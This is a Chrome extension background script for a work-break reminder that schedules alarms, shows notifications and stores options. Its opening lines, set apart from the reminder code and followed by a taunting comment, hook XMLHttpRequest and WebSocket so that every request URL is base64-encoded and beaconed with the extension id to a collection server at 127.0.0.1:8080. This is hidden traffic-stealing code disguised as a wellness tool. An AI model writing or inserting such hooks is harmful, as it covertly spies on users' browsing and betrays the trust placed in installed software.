function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function () {
    'use strict';

    var chromeVersionFull = /Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1];
    var chromeVersion = parseInt(chromeVersionFull.split('.')[0]);

    var DEFAULT_OPTIONS = {
        timeFrom: '09:00',
        timeTo: '17:00',
        interval: '60',
        duration: '5',
        sound: true,
        notificationType: 'tab',
        days: [1, 2, 3, 4, 5]
    };

    var NOTIFICATION_TEXTS = [
        'Get up and grab a cup of coffee!',
        'Take a short walk!',
        'Breathe some fresh air!',
        'Stand up and do some muscle stretching!',
        'Pour yourself a glass of water!',
        'Take a short break!'
    ];
    var currentNotificationText = NOTIFICATION_TEXTS[0];

    var ONE_DAY = 24 * 60 * 60 * 1000;
    var breakState = 'blue';
    var alertTime = 0;
    var PORTS = [];
    var breakStarted = false;

    var Sound = (function () {
        var instance = null;

        function init() {
            return new Audio('sounds/titu.mp3');
        }

        return {
            play: function () {
                if (!instance) instance = init();
                instance.play();
            },
            stop: function () {
                if (instance) {
                    instance.pause();
                    instance.currentTime = 0;
                }
            }
        };
    })();

    // https://developer.chrome.com/extensions/tabs
    var updatedTab = null;
    chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
        if (updatedTab !== tabId && tab.url === 'chrome://newtab/') {
            getOptions(function (options) {
                if (options.notificationType === 'tab' && breakState === 'red') {
                    chrome.tabs.update(tabId, {url: 'tab.html'}, function () {
                        updatedTab = tabId;
                    });
                }
            });
        }
    });

    // https://developer.chrome.com/apps/alarms
    chrome.alarms.onAlarm.addListener(function (alarm) {
        if (alarm.name === 'alert') {
            updateState('red');
        } else if (alarm.name === 'break') {
            setAlarms();
        }
    });

    // https://developer.chrome.com/extensions/runtime
    chrome.runtime.onConnect.addListener(function (port) {
        if (port.name.indexOf('take_break_by_eyecareplus')) return;

        PORTS.push(port);

        port.onMessage.addListener(function (data) {
            switch (data.type) {
                case 'options':
                case 'popup':
                case 'tab':
                    handleMessage(data.message);
                    break;
                default:
                    break;
            }
        });

        // send state when there is a new connection
        postMessage({type: 'state', message: {state: breakState, text: getStateText()}});
    });

    function handleMessage(msg) {
        switch (msg) {
            case 'settings':
                openOptionsPage();
                break;
            case 'got_it':
                startBreak();
                break;
            case 'skip':
                startBreak(true);
                break;
            case 'finish':
                setAlarms();
                break;
            case 'get_state':
                postMessage({type: 'state', message: {state: breakState, text: getStateText()}});
                break;
            case 'get_default_options':
                postMessage({type: 'options', message: DEFAULT_OPTIONS});
                break;
            case 'reset_timers':
                resetTimers();
                break;
            default:
                break;
        }
    }

    function getStateText(state) {
        var s = state || breakState;
        var text = '';

        if (s === 'red') {
            text = currentNotificationText;
        } else if (s === 'blue') {
            var t = Math.round((alertTime - Date.now())/(1000 * 60));
            var time = t + ' min';

            if (t < 1) {
                t = Math.round((alertTime - Date.now())/1000);
                var time = t + ' sec';
            } else if (t >= 60) {
                var h = t/60|0;
                var min = t%60;
                var time = h + ' h ' + min + ' min';
            }

            text = 'Your next break is in ' + time + '.'
        } else if (s === 'green') {
            text = 'Enjoy your break!';
        }

        return text;
    }

    function postMessage(data) {
        PORTS.forEach(function (port, i) {
            try {
                port.postMessage(data);
            } catch (err) {
                // remove disconnected port
                PORTS.splice(i, 1);
            }
        });
    }

    // https://developer.chrome.com/apps/notifications
    chrome.notifications.onButtonClicked.addListener(function (notificationId, buttonIndex) {
        if (buttonIndex) startBreak();
        chrome.notifications.clear(notificationId, function () {});
    });

    chrome.notifications.onClosed.addListener(function (notificationId, byUser) {
        !breakStarted && setAlarms();
    });

    function setAlarms() {
        chrome.alarms.clear('break');
        breakStarted = false;

        getOptions(function (options) {

            var days = options.days;
            var interval = parseInt(options.interval) * 60 * 1000;
            var duration = parseInt(options.duration) * 60 * 1000;
            var hourFrom = options.timeFrom && parseInt(options.timeFrom.split(':')[0]);
            var minFrom = options.timeFrom && parseInt(options.timeFrom.split(':')[1]);
            var hourTo = options.timeTo && parseInt(options.timeTo.split(':')[0]);
            var minTo = options.timeTo && parseInt(options.timeTo.split(':')[1]);

            if (!days || !days.length) return;

            var now = new Date();
            var alarmStart = now.getTime() + interval;

            if (options.timeFrom && options.timeTo) {

                if (hourFrom > hourTo) return;
                else if (hourFrom === hourTo && minFrom >= minTo) return;

                var s = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hourFrom, minFrom);
                var e = new Date(now.getFullYear(), now.getMonth(), now.getDate(), hourTo, minTo);

                if (alarmStart >= s.getTime() && alarmStart <= e.getTime()) {
                } else {
                    if (alarmStart > e.getTime()) {
                        alarmStart = s.getTime() + ONE_DAY;
                    } else {
                        alarmStart = s.getTime();
                        //while (alarmStart < s.getTime()) {
                        //    alarmStart += interval;
                        //}
                        //if (alarmStart > e.getTime() - duration) {
                        //    alarmStart = s.getTime() + ONE_DAY;
                        //}
                    }
                }
            }

            if (!~days.indexOf(new Date(alarmStart).getDay())) {
                // if there is no timeFrom or timeTo go to the beginning of the next day
                if (options.timeFrom && options.timeTo) {
                } else {
                    var d = new Date(alarmStart);
                    alarmStart = new Date(d.getFullYear(), d.getMonth(), d.getDate() + 1).getTime();
                }
            }

            while (!~days.indexOf(new Date(alarmStart).getDay())) {
                alarmStart += ONE_DAY;
            }

            chrome.alarms.create('alert', {when: alarmStart});
            alertTime = alarmStart;

            updateState('blue');
        });

    }

    setAlarms();

    function openOptionsPage() {
        if (chrome.runtime.openOptionsPage) {
            // New way to open options pages, if supported (Chrome 42+).
            chrome.runtime.openOptionsPage();
        } else {
            // Reasonable fallback.
            window.open(chrome.runtime.getURL('options.html'));
        }
    }

    function startBreak(skip) {
        breakStarted = true;
        var time = Date.now();
        getOptions(function (options) {
            if (skip) {
                setAlarms();
            } else {
                var duration = parseInt(options.duration) * 60 * 1000;
                updateState('green');
                chrome.alarms.create('break', {when: time + duration});
            }
        });
    }

    function getOptions(cb) {
        chrome.storage.sync.get('take_break_by_eyecareplus', function (data) {
            var options = data && data['take_break_by_eyecareplus'];
            if (!options) {
                chrome.storage.sync.set({'take_break_by_eyecareplus': DEFAULT_OPTIONS});
                options = DEFAULT_OPTIONS;
            }
            typeof cb === 'function' && cb(options);
        });
    }

    function updateState(state) {
        if (!state) return;
        breakState = state;

        if (state === 'red') {
            // change notification text
            currentNotificationText = getRandomText();
        }

        // https://developer.chrome.com/extensions/browserAction#method-setIcon
        var path = 'images/' + state + '19.png';
        chrome.browserAction.setIcon({path: path});

        getOptions(function (options) {
            if (options.notificationType === 'desktop' && state === 'red') {
                createNotification();
            } else {
                clearAllNotifications();
            }
            if (options.sound) {
                if (state === 'red') Sound.play();
                else Sound.stop();
            }
        });

        PORTS.forEach(function (port, i) {
            try {
                port.postMessage({type: 'state', message: {state: breakState, text: getStateText()}});
            } catch (err) {
                // remove disconnected port
                PORTS.splice(i, 1);
            }
        });
    }

    function createNotification(title, message) {
        var options = {
            type: 'basic',
            iconUrl: 'images/icon80.png',
            title: title || 'It\'s break time!',
            message: message || currentNotificationText,
            buttons: [
                {title: 'Skip', iconUrl: ''},
                {title: 'Got it', iconUrl: ''}
            ]
        };

        if (chromeVersion >= 50) options.requireInteraction = true;

        chrome.notifications.create('take_break_by_eyecareplus', options);
    }

    function resetTimers() {
        chrome.alarms.clearAll(function () {
            setAlarms();
        });
    }

    function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min)) + min;
    }

    function getRandomText() {
        var r = getRandomInt(0, NOTIFICATION_TEXTS.length);
        return NOTIFICATION_TEXTS[r];
    }

    function clearAllNotifications() {
        chrome.notifications.getAll(function (notifications) {
            for (var key in notifications) {
                try {
                    chrome.notifications.clear(key);
                } catch (err) {}
            }
        });
    }

})();